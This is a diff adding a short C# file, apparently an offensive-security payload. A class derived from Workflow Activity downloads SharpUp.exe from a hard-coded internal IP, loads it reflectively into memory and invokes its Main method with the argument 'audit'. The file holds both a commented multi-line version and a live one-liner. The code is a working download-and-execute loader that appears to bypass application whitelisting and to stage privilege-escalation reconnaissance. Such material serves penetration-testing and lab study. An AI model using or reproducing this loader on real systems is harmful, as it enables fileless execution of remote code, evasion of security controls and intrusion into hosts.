@@ -1,0 +1,18 @@
+﻿using System;
+using System.Workflow.ComponentModel;
+public class Run : Activity
+{
+    public Run()
+    {
+        //System.Net.WebClient myWebClient = new System.Net.WebClient();
+        //byte[] data = myWebClient.DownloadData("http://192.168.49.102/SharpUp.exe");
+        //System.Reflection.Assembly assem = System.Reflection.Assembly.Load(data);
+        //Type myClass = assem.GetType("SharpUp.Program");
+        //System.Reflection.MethodInfo method = myClass.GetMethod("Main");
+        //method.Invoke(0, new object[] { new string[] { "audit" } });
+
+        // one liner
+        System.Reflection.Assembly.Load(new System.Net.WebClient().DownloadData("http://192.168.49.102/SharpUp.exe")).GetType("SharpUp.Program").GetMethod("Main").Invoke(0, new object[] { new string[] { "audit" } });
+    }
+}
+
